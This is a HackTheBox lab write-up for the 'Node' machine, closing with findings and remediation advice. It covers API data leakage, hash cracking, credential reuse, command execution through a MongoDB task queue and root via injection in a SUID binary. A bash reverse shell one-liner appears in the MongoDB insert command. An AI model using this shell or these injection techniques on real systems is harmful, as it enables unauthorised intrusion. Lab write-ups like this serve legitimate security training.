# Node (HackTheBox) Writeup

## Enumeration
#### Nmap Scan Results
Nmap scan results reveal SSH running on port 22 and Apache-Hadoop running on port 3000.
![](assets/node/Pasted%20image%2020261109221154.png)

The web application's home page displays a static image with the `WELCOME TO MYPLACE` text, as well as a `LOGIN` button in the top right.
![](assets/node/Pasted%20image%2020261109221346.png)

The button redirects to a login page. Attempts at using default credentials or SQL Injection authentication bypass mechanisms fail.
![](assets/node/Pasted%20image%2020261109221417.png)

The page source reveals multiple loaded scripts, including ones from the `assets/js/app/controllers/` path, a directory structure also commonly found in Node.js applications.
![](assets/node/Pasted%20image%2020261109221520.png)

The `home.js` file reveals a function that sends a GET request to `/api/users/latest` and retrieves user data.
![](assets/node/Pasted%20image%2020261109221733.png)

A GET request to the identified path is sent through Burp Suite. The web application's response contains three users with their hashed passwords and the `is_admin` field set to `false`.
![](assets/node/Pasted%20image%2020261109222304.png)

The `admin.js` file reveals the `/api/admin/backup` endpoint. However, a direct GET request results in an error due to failed authentication.
![](assets/node/Pasted%20image%2020261109222203.png)

The `profile.js` file contains a function similar to the one found in `home.js`, however, it sends a GET request to the `/api/users` endpoint.
![](assets/node/Pasted%20image%2020261109222428.png)

A subsequent GET request is sent to `/api/users`, revealing an additional `myP14ceAdm1nAcc0uNT` user, with the `is_admin` field set to `true`.
![](assets/node/Pasted%20image%2020261109222630.png)

CrackStation is used to identify the hash type as sha256 and retrieve the plaintext password: `manchester`.
![](assets/node/Pasted%20image%2020261109222729.png)
## Initial Access
Authentication to the MYPLACE application is successful, obtaining a cookie value. The cookie is then used in a GET request to the `/api/admin/backup` endpoint that was not accessible beforehand.
![](assets/node/Pasted%20image%2020261109222935.png)

This time, however, the web application returns Base64-encoded data.
![](assets/node/Pasted%20image%2020261109223019.png)

The data is saved to a file and decoded with `base64 -d`, redirecting the output to a different file. The `file` command is then used to identify the decoded file as a ZIP archive.
![](assets/node/Pasted%20image%2020261109223146.png)

The `zip2john` command is used to extract the ZIP archive's password to a file. John the Ripper then successfully cracks it.
![](assets/node/Pasted%20image%2020261109223245.png)

The files are then extracted from the archive.
![](assets/node/Pasted%20image%2020261109223331.png)

The `app.js` file contains hardcoded MongoDB credentials for the user `mark`. The application seems to run on port 27017 locally on the target host.
![](assets/node/Pasted%20image%2020261109223420.png)

These credentials are used to obtain access to the `node` host through SSH.
![](assets/node/Pasted%20image%2020261109223508.png)
## Privilege Escalation
Enumeration of files with the SUID or SGID bits set reveals `/usr/local/bin/backup`, which has the SUID bit set, is owned by `root`, and belongs to the `admin` group. However, the compromised user is not a member of the group and cannot execute the binary directly.
![](assets/node/Pasted%20image%2020261109223744.png)

Using `ss -tulpn` reveals that port 27017 is in a `LISTEN` state, suggesting that MongoDB is running.
![](assets/node/Pasted%20image%2020261109223921.png)

The `ps aux` command reveals a node process running as the user `tom` that uses the `/var/scheduler/app.js` file.
![](assets/node/Pasted%20image%2020261109224158.png)

The file contains a MongoDB authentication string using `mark`'s credentials to connect to the `scheduler` database.
![](assets/node/Pasted%20image%2020261109224317.png)

MongoDB CLI is used to connect to the `scheduler` database as `mark`.
![](assets/node/Pasted%20image%2020261109224408.png)

The following command is then used to execute a Bash reverse shell one-liner from the database:
```mongodb
db.tasks.insert({"cmd":"/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.147/443 0>&1'"});
```

This results in an established reverse shell as the user `tom`.
![](assets/node/Pasted%20image%2020261109224600.png)

Using the `groups` command reveals that `tom` is a member of the `admin` group, which is allowed to run the previously found `backup` binary.
![](assets/node/Pasted%20image%2020261109224659.png)

The `backup` binary requires three parameters, with `-q`, a backup_key and a directory name.
![](assets/node/Pasted%20image%2020261109224810.png)

The backup keys are found in `/etc/myplace/keys`.
![](assets/node/Pasted%20image%2020261109224939.png)

An attempt to use the binary to back up `/root/.ssh` returns a Base64-encoded string.
![](assets/node/Pasted%20image%2020261109225022.png)

The encoded string is a ZIP archive containing a `root.txt` file. However, reading the file returns a troll face.
![](assets/node/Pasted%20image%2020261109225150.png)

The backup binary is copied to the local attacking machine and inspected through `radare2`, revealing that the binary constructs the command `/usr/bin/zip -r -P magicword %s %s > /dev/null` using `sprintf()` and executes it through `system()`, with `%s` representing the supplied user input.
![](assets/node/Pasted%20image%2020261109225233.png)

Since the binary incorporates user input directly into a command executed through `system()` without proper sanitization, it is possible to inject additional commands using newline characters. By leaving quotation marks open in the third parameter, the terminal allows the input to continue across multiple lines. The second line is used to execute `/bin/bash`, while the third line contains arbitrary input and closes the quotation marks. The first command fails because the specified file does not exist, but this does not prevent the injected `/bin/bash` command from executing. The remaining output is redirected to `/dev/null`.

Using this method results in a spawned root shell.
![](assets/node/Pasted%20image%2020261109225804.png)

## Findings & Remediation

### Unauthenticated Sensitive Information Disclosure
#### Description
The `/api/users/latest` and `/api/users` endpoints do not enforce authentication or proper access controls, allowing unauthenticated users to retrieve sensitive user information, including usernames, password hashes, and administrative account details.
#### Impact
An unauthenticated attacker can enumerate user accounts, identify administrative users, and obtain password hashes for offline cracking. In this case, the exposed information allowed the attacker to identify the administrator account and recover its plaintext password, which was subsequently used to access the administrative backup endpoint.
#### Remediation
Enforce server-side authentication and authorization checks on API endpoints that expose user information. Restrict access to user records based on the requesting user's permissions and exclude password hashes and other sensitive fields from API responses, even for authenticated users unless explicitly required.

### Weak Password Hashing
#### Description
The application stores user passwords using SHA-256, a general-purpose cryptographic hashing algorithm that is not designed for secure password storage. Unlike dedicated password hashing algorithms, SHA-256 is computationally fast and does not provide built-in protection against offline password cracking.
#### Impact
An attacker who obtains the stored password hashes can attempt to recover plaintext passwords through offline cracking. In this case, the administrator's password hash was successfully cracked using CrackStation, allowing unauthorized access to the administrative account.
#### Remediation
Replace SHA-256 password hashing with a dedicated password hashing algorithm such as Argon2id, bcrypt, or scrypt, using unique salts and appropriate computational cost parameters. Require affected users to reset their passwords and securely rehash them using the updated algorithm.
### Credential Reuse
#### Description
The MongoDB credentials for the `mark` user are stored in the application's `app.js` file. The same credentials are also used for the `mark` operating system account, allowing authentication through SSH.
#### Impact
An attacker who obtains the application source code can recover the MongoDB credentials and reuse them to authenticate to the target host through SSH, gaining access to the `mark` account.
#### Remediation
Use separate credentials for database access and operating system accounts. Configure a dedicated MongoDB account with only the permissions required by the application, and store its credentials securely using a secrets management solution or appropriately protected configuration files. Rotate the exposed credentials.
### Arbitrary Command Execution via MongoDB Tasks
#### Description
The `scheduler` MongoDB database allows the `mark` account to insert records containing operating system commands into the `tasks` collection. A Node.js process running as the `tom` user is associated with the same database, and commands inserted into the collection are executed without sufficient restrictions.
#### Impact
An attacker with access to the `mark` database credentials can insert malicious commands into the `tasks` collection to achieve operating system command execution. In this case, inserting a Bash reverse shell command resulted in a shell running as the `tom` user.
#### Remediation
Restrict database permissions to prevent unauthorized insertion or modification of executable tasks. Avoid executing arbitrary commands stored in database records, and enforce strict validation and allowlisting of permitted operations. Ensure that any process handling database tasks runs with the minimum privileges required.
### Command Injection in SUID Binary
#### Description
The `/usr/local/bin/backup` binary is owned by `root`, has the SUID bit set, and is executable by members of the `admin` group. The binary constructs a shell command using `sprintf()` with user-controlled parameters and executes it through `system()` without proper input sanitization, allowing shell command injection.
#### Impact
An attacker with access to an account belonging to the `admin` group can inject arbitrary shell commands into the backup operation. Since the binary executes with root privileges, successful exploitation allows the attacker to execute commands as `root`, resulting in full system compromise.
#### Remediation
Avoid constructing shell commands using user-controlled input and executing them through `system()`. Replace shell-based execution with safer process execution methods that pass arguments directly without invoking a shell. Validate all user-supplied parameters against strict allowlists and remove the SUID bit if elevated privileges are not required. If privileged execution is necessary, isolate the privileged operations and enforce the principle of least privilege.
